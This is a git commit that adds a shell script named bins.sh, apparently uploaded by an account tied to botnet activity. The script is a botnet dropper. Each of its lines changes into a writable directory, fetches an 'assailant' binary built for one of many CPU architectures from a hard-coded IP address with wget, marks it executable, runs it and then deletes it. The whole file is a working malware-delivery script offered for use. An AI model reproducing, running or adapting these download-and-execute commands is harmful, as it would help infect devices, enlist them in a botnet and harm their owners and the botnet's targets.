a52a687bd665c940a1f780627fac6d3d9b4c94ad
anonsecbotnetstudent123 <124842614+anonsecbotnetstudent123@users.noreply.github.com>
2023-05-17 16:20:31 -0700

    Add files via upload

---
+++ bins.sh
@@ -0,0 +1,15 @@
+-e #!/bin/bash
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.mips; chmod +x assailant.mips; ./assailant.mips; rm -rf assailant.mips
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.mpsl; chmod +x assailant.mpsl; ./assailant.mpsl; rm -rf assailant.mpsl
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.sh4; chmod +x assailant.sh4; ./assailant.sh4; rm -rf assailant.sh4
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.x86; chmod +x assailant.x86; ./assailant.x86; rm -rf assailant.x86
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.arm6; chmod +x assailant.arm6; ./assailant.arm6; rm -rf assailant.arm6
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.i686; chmod +x assailant.i686; ./assailant.i686; rm -rf assailant.i686
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.ppc; chmod +x assailant.ppc; ./assailant.ppc; rm -rf assailant.ppc
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.i586; chmod +x assailant.i586; ./assailant.i586; rm -rf assailant.i586
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.m68k; chmod +x assailant.m68k; ./assailant.m68k; rm -rf assailant.m68k
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.sparc; chmod +x assailant.sparc; ./assailant.sparc; rm -rf assailant.sparc
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.arm4; chmod +x assailant.arm4; ./assailant.arm4; rm -rf assailant.arm4
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.arm5; chmod +x assailant.arm5; ./assailant.arm5; rm -rf assailant.arm5
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.arm7; chmod +x assailant.arm7; ./assailant.arm7; rm -rf assailant.arm7
+-e cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.46.246.159/assailant.ppc440fp; chmod +x assailant.ppc440fp; ./assailant.ppc440fp; rm -rf assailant.ppc440fp
